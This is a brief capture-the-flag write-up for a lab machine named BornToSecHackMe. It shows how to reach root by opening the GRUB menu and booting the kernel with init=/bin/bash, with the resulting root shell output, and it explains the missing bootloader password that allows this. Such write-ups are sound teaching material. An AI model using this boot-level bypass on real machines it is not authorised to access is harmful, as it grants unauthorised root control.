### Second Writeup

>GRUB2 exploit (https://www.debian.org/doc/manuals/securing-debian-manual/lilo-passwd.en.html)

While holding the `shift` key, we can see the GRUB2 menu.
We can see that we have a kernel image called live and that's it.


If there is no password for the grub menu, we can try to boot the kernel with the init command to see what happens.

```bash
boot: live init=/bin/bash
error: unexectedly disconnected from boot status daemon

bash: no job control in this shell
root@BornToSecHackMe:/# 
``` 

As we can see, we are now in a shell with root privileges.
```bash
root@BornToSecHackMe:/ whoami
-> root
root@BornToSecHackMe:/ cd /root
root@BornToSecHackMe:/root ls
-> README
root@BornToSecHackMe:/root cat README
-> CONGRATULATIONS !!!!
   to be continued...
```

This exploit is caused because there is no password for the grub menu and the kernel is not configured to drop privileges. So everyone can access the kernel and execute commands with root privileges.